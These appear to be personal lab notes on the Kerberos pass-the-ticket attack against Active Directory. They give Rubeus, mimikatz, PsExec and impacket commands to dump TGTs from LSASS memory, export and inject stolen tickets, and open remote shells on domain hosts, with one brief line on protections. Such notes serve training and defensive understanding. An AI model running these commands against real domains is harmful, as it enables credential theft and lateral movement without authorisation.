
To see : 
[[Kerberos]]

Source : 
https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/pass-the-ticket
https://www.thehacker.recipes/a-d/movement/kerberos/ptt

https://attack.mitre.org/techniques/T1550/003/

Kerberos

rubeus.exe dump /user:katrina.mendoza.adm /service:krbtgt

rubeus.exe ptt /ticket:

### Step of pass the tickets attack

Extract the TGT from the LSASS memory 
	▪ This requires the seDebugPrivilege 
	▪ Requires that the targeted identity has cached its credentials 
Inject the TGT into your current session 
	▪ Either locally, or later on other systems by exporting it to a file 
	▪ The “new” ticket is used to request new service tickets 
Does not trigger any failed authentication attempts

This is possible because the hash is in the memory Needed for Single Sign-On


Attack’s pre-requisites 
	A victim is connected to the system, or a service is running under a user account - seDebugPrivilege, or LSASS memory dump 
Protection
	 Healthy administration practices (do not connect to untrusted systems with privileged accounts, use RDP restricted mode or remote credential guard)



## Details : Step of pass-the-ticket attack

Try to steal the TGT of a privileged account to impersonate his or her on other system without knowing her password.

### Extract the TGT from the LSASS memory : Export tickets out of SRV

 `psexec.exe \\SRV01 cmd.exe -accepteula`

```powershell
rubeus.exe dump /user:katrina.mendoza.adm /service:krbtgt
```

Result : 
![[Pasted image 20231024213403.png]]

Save the result in `C:\Users\Public\tgt.txt`

```powershell
# Using mimikatz
sekurlsa::tickets /export
# Using Rubeus
## Dump all tickets
.\Rubeus dump
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))

## List all tickets
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```



### Inject the TGT into your current session : Inject stolen tickets into memory

Put the base64 ticket into your clipboard.
In the **Windows Terminal** window, run 
`(Get-Content C:\Users\Public\tgt.txt) -join "" -replace " " | clip`.

Run `klist`.
It should return a bunch of Kerberos ticket. The one for your current session. Note that all of them are for the Client: red @ CONTOSO.COM. Those tickets were obtains thanks to our TGT. You can see the TGT by running klist tgt. It should look like this: 
![[Pasted image 20231024213850.png]]

`rubeus.exe ptt /ticket:<The-ticket>` 

It should look like this: ![v2nlpjjb.png](https://labondemand.blob.core.windows.net/content/lab127288/v2nlpjjb.png)

```powershell
.\Rubeus.exe ptt /ticket:[0;28419fe]-2-1-40e00000-trex@krbtgt-JURASSIC.PARK.kirbi
```

or mimikatz

```powershell
mimikatz.exe "kerberos::ptt [0;28419fe]-2-1-40e00000-trex@krbtgt-JURASSIC.PARK.kirbi"
```

```powershell
klist #List tickets in cache to check that mimikatz has loaded the ticket
.\PsExec.exe -accepteula \\lab-wdc01.jurassic.park cmd
```

All your tickets are gone and being replaced by the one you've stolen from SRV01.
 
In the same console, try again to browse the C$ share of a domain controller by running `dir \\DC01\C$`.
You now have three tickets:
![[Pasted image 20231024213937.png]]

In linux 

```bash
export KRB5CCNAME=/root/impacket-examples/krb5cc_1120601113_ZFxZpK 
python psexec.py jurassic.park/trex@labwws02.jurassic.park -k -no-pass
```

